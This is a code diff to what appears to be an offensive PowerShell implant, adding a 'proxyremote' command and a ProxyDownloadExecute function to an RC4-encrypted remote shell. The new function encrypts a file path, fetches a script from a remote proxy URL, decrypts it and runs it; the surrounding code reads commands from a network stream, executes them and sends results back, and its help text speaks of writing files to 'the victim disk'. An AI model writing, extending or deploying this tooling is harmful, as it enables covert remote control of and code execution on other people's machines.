@@ -39,6 +39,7 @@ function Show-Help {
             Write-Output "[-] ERROR: $($ErrorMessage)"
         }
         Write-Output "`nSupported commands:`n------------------------------`n"
+        Write-Output "`tproxyremote`t[url path cmd]`tRemotely download powershell script and execute a command through the built in proxy"
         Write-Output "`tread`t[path]`t`tShow the content of the specified file"
         Write-Output "`tremote`t[url cmd]`tRemotely download powershell script and execute a command"
         Write-Output "`tupload`t[url path]`tDownload a remote file and save it to the victim disk"
@@ -80,7 +81,15 @@ function Parse-Command {
                 $Output = "Show-Help -ErrorMessage 'Missing arguments'"
             }
 
-        } elseif($Args[0].ToLower().Equals("help")) {
+        } elseif($Args[0].ToLower().Equals("proxyremote")) {
+            $Args = $CmdArgs.Split(" ", 4, [System.StringSplitOptions]::RemoveEmptyEntries)
+            if($Args.Length -ge 4) {
+                $Output = "ProxyDownloadExecute -Url '$($Args[1])' -Path '$($Args[2])'-Cmd '$($Args[3])' -Key $($Key)"
+            } else {
+                $Output = "Show-Help -ErrorMessage 'Missing arguments'"
+            }
+
+        }elseif($Args[0].ToLower().Equals("help")) {
             $Output = "Show-Help"
 
         } else {
@@ -90,6 +99,7 @@ function Parse-Command {
         return $Output
     }
 }
+
 
 function Crypto-RC4 {
     [CmdletBinding()]
@@ -146,6 +156,7 @@ function PS-RemoteShell {
 		[byte[]]$bytes = 0..255|%{0}
 		[byte[]]$sendData
 		
+		
 		$prompt = [text.encoding]::ASCII.GetBytes((Shell-Prompt))
 		$sendData = ($prompt | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
 		$stream.Write($sendData, 0, $sendData.Length)
@@ -153,18 +164,18 @@ function PS-RemoteShell {
 		while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 			
 			$Cmd = ($bytes | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
-            		$Cmd = [Text.Encoding]::ASCII.GetString($Cmd, 0, $i)
-            		$Cmd = Parse-Command -CmdArgs $Cmd -Key $key
+			$Cmd = [Text.Encoding]::ASCII.GetString($Cmd, 0, $i)
+			$Cmd = Parse-Command -CmdArgs $Cmd -Key $key
 
 			$Output = ([ScriptBlock]::Create($Cmd).Invoke() | Out-String)
 			$Output  = $Output + "`n"
 			$errorMessage = ($error[0] | Out-String)
 			$error.clear()
 			$Output = $Output + $errorMessage
-						
+
 			$sendBytes = [Text.Encoding]::ASCII.GetBytes($Output) + $prompt
 			$sendData = ($sendBytes | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
-			
+
 			$size = [Text.Encoding]::ASCII.GetBytes("PACKETSIZE=" + $sendData.Length)
 			$sendSize = ($size | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($key)))
 			$stream.Write($sendSize, 0, $sendSize.Length)
@@ -209,7 +220,7 @@ function DownloadToDisk {
 		} Catch {
 		    Display-Message -Module $moduleName -Message "failed to download $($Url)"
 		}
-	}
+		}
 
     END {
         Display-Message -Module $moduleName -Message "execution Completed"
@@ -229,12 +240,52 @@ function DownloadExecute {
 
     BEGIN {
         $moduleName = "DownloadExecute"
-		Display-Message -Module $moduleName -Message "Fetching $($url)"
+		Display-Message -Module $moduleName -Message "Fetching $($Url)"
     }
 
     PROCESS {
         Try {
-            $data = (New-Object Net.WebClient).DownloadData($url)
+            $data = (New-Object Net.WebClient).DownloadData($Url)
+            $buffer = ($data | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
+
+            Display-Message -Module $moduleName -Message "Executing $($Cmd)"
+
+            $Cmd = [Text.Encoding]::ASCII.GetString($buffer) + ";" + $Cmd
+            Write-Output ([ScriptBlock]::Create($Cmd).Invoke() | Out-String)
+        } Catch {
+            Display-Message -Module $moduleName -Message "failed to download $($Url)"
+        }
+    }
+
+    END {
+        Display-Message -Module $moduleName -Message "execution Completed"
+    }
+}
+
+function ProxyDownloadExecute {
+	[CmdletBinding()]
+	Param(
+	[Parameter(Mandatory=$True)]
+	[string]$Url,
+	[Parameter(Mandatory=$True)]
+	[string]$Cmd,
+	[Parameter(Mandatory=$True)]
+	[string]$Path,
+	[Parameter(Mandatory=$True)]
+	[string]$Key
+	)
+
+    BEGIN {
+        $moduleName = "ProxyDownloadExecute"
+	Display-Message -Module $moduleName -Message "Fetching $($Path)"
+        Display-Message -Module $moduleName -Message "Proxying through $($Url)"
+    }
+
+    PROCESS {
+        $encryptedPath = ($Path | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
+        $Url = $Url + "?" + [Convert]::ToBase64String($encryptedPath)
+        Try {
+            $data = (New-Object Net.WebClient).DownloadData($Url)
             $buffer = ($data | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
 
             Display-Message -Module $moduleName -Message "Executing $($Cmd)"
@@ -260,7 +311,7 @@ function ReadFile {
 
     BEGIN {
         $moduleName = "ReadFile"
-	Display-Message -Module $moduleName -Message "Reading $($Path)"
+		Display-Message -Module $moduleName -Message "Reading $($Path)"
         $buffer = Get-Content $Path
         Write-Output $buffer
     }
